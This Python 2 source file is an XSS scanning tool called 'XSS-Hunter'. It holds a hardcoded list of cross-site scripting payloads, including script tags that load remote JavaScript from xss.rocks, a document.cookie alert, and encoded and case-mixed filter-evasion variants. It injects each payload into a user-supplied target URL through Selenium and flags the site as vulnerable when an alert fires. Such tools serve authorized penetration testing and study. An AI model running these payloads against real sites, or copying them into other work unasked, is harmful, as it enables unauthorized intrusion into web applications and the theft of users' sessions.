#/usr/bin/python
# -*- coding: utf-8 -*-
#
#    Xss-Hunter By SajjadBND (Biskoit Pedar)
#
#    version : 0.1
#    Email   : blackwolf@post.com
#    Githun  : https://github.com/blackwolf-iran
#
#

import time
import os
import platform
import sys
import bcolors
from selenium import webdriver
from selenium.common.exceptions import NoAlertPresentException
from selenium.webdriver.common.keys import Keys

global payload
payload = [
	"<script>alert('Xss')</script>"
	,""""><script>alert('Xss')</script>"""
	,'<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>'
	,"<sCrIpT>alert('xss');</ScRiPt>"
	,"""</script><script>alert('XSS');</script>"""
	,"""<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>"""
	,"<BODY ONLOAD=alert('XSS')>"
	,"""<script>alert(document.cookie)</script>">"""
	,"""<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>"""
	,"""<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>"""
	,"""<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>"""
	,"""<<SCRIPT>alert("XSS");//<</SCRIPT>"""
	,"""</TITLE><SCRIPT>alert("XSS");</SCRIPT>"""
	,"<svg/onload=alert('XSS')>"
	,"""%3Cscript%3Ealert%28%2fXSS%2f%29%3B%3C%2fscript%3E"""
]
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def logo():
	print "\nXSS-Hunter v 0.1 by" + bcolors.FAIL + " SajjadBnd\n" + bcolors.ENDC
	print bcolors.BOLD + bcolors.UNDERLINE + "--== Advanced Tool for test XSS - Bypass[soon] =) ==--" + bcolors.ENDC
	print bcolors.BOLD+"\n   blackwolf@post.com"
	print "   https://github.com/Blackwolf-iran"
	print "+++++++++++++++++++++++++++++++++++++++" +bcolors.ENDC
	print bcolors.FAIL + """
 __  __  ____    ____            _   _                   _                 
 \ \/ / / ___|  / ___|          | | | |  _   _   _ __   | |_    ___   _ __ 
  \  /  \___ \  \___ \   _____  | |_| | | | | | | '_ \  | __|  / _ \ | '__|
  /  \   ___) |  ___) | |_____| |  _  | | |_| | | | | | | |_  |  __/ | |   
 /_/\_\ |____/  |____/          |_| |_|  \__,_| |_| |_|  \__|  \___| |_|   
                                                                           
"""+bcolors.ENDC
def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])

def execute():
 target = raw_input("\t\n Target "+bcolors.WARNING+"(with http) : "+bcolors.ENDC) 
 driver = webdriver.Firefox()
 driver.set_window_size(400,400)
 driver.set_window_position(200, 500)
 global hit
 hit = 0
 print "\n"
 for x in payload:
    driver.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
    url = target +  x
    driver.get(url)
    try:
        driver.switch_to.alert.accept()
	print "=================================="
	print "|"
        print bcolors.OKGREEN + bcolors.BOLD + "[+] Vulnerable!"+bcolors.ENDC
	print bcolors.OKGREEN + bcolors.BOLD +"[+] Payload:",x+bcolors.ENDC
	print "|"
	hit = hit + 1
    except NoAlertPresentException:
	print "=================================="
	print "|"
        print  bcolors.FAIL + bcolors.BOLD + "[-] XSS Nadare ! ¯\_(ツ)_/¯ " + bcolors.ENDC
	print bcolors.FAIL + bcolors.BOLD + "[-] Paylaod :", x + bcolors.ENDC
	print "|"

def goodbye():
	aa = 0
	bb = 25
	while (aa < bb):
		print "=",
		sys.stdout.flush()
		time.sleep(0.2)
		aa = aa + 1

	time.sleep(1)
	print "\n\n[+] Successful :",hit
	time.sleep(1)
	print bcolors.WARNING + "\n\t@by SajjadBnd"+bcolors.ENDC
	print bcolors.UNDERLINE + "\t[*] Good Luck !\n" + bcolors.ENDC

if __name__ == '__main__':
	clear()
	logo()
	while True:
		try:
			execute()
			goodbye()
			break
  		except KeyboardInterrupt:
   			print "\n\n[+] Ctrl+c Detected ! ¯\_(ツ)_/¯\n[-] Khodafezi!\n"
			break
		#except:
  		 #       print('\n\n[-] Error - Lotfan bug script+ScreenShot+Tozihat ra baraye ma Email konid..')
		        break

